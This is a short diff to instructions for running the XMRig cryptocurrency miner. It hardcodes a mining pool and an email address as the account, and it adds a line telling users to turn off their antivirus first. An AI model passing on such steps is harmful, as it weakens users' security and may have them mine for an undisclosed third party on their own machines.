@@ -3,8 +3,10 @@ Copy and paste the commands below into the terminal
 
 COMMAND LINES FOR RUNNING THE SCRIPT
 
- cd bmxmrig
+make sure to turn off your antivirus when running this script 
 
- chmod u+x ./xmrig #
+cd bmxmrig
 
- ./xmrig -o xmr.pool.minergate.com:45700 -u osarumenscott9@gmail.com -p x --donate-level 1
+chmod u+x ./xmrig #
+
+./xmrig -o xmr.pool.minergate.com:45700 -u osarumenscott9@gmail.com -p x --donate-level 1
